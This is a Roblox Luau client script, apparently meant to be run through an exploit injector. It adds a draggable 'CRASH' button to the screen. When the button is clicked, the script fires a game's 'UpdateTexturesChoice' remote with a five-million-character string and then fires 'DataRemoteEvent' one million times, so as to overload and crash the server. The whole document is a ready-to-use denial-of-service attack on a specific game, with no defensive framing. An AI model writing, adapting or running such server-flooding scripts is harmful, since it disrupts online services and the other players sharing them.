local player = game:GetService("Players").LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local gui = Instance.new("ScreenGui")
gui.Name = "SimpleCrashMenu"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 120, 0, 40)
frame.Position = UDim2.new(1, -140, 0.5, -20)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 8)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(255, 50, 50)
stroke.Thickness = 2

local button = Instance.new("TextButton")
button.Size = UDim2.new(1, -10, 1, -10)
button.Position = UDim2.new(0, 5, 0, 5)
button.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
button.Text = "CRASH"
button.TextColor3 = Color3.new(1, 1, 1)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 18
button.Parent = frame

local btnCorner = Instance.new("UICorner", button)
btnCorner.CornerRadius = UDim.new(0, 6)
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
button.MouseButton1Click:Connect(function()
    button.Text = "CRASHING..."
    button.BackgroundColor3 = Color3.fromRGB(100, 20, 20)
    task.spawn(function()
        local DataEvents = RS:FindFirstChild("DataEvents")
        
        if not DataEvents then
            button.Text = "NO REMOTES"
            return
        end
        local UpdTextures = DataEvents:FindFirstChild("UpdateTexturesChoice")
        if UpdTextures then
            pcall(function()
                UpdTextures:FireServer(string.rep("A", 5e6))
            end)
        end
        local DataRemote = DataEvents:FindFirstChild("DataRemoteEvent")
        if DataRemote then
            for i = 1, 1000000 do
                DataRemote:FireServer()
                if i % 1000 == 0 then
                    task.wait() 
                end
            end
        end
        button.Text = "DONE"
    end)
end)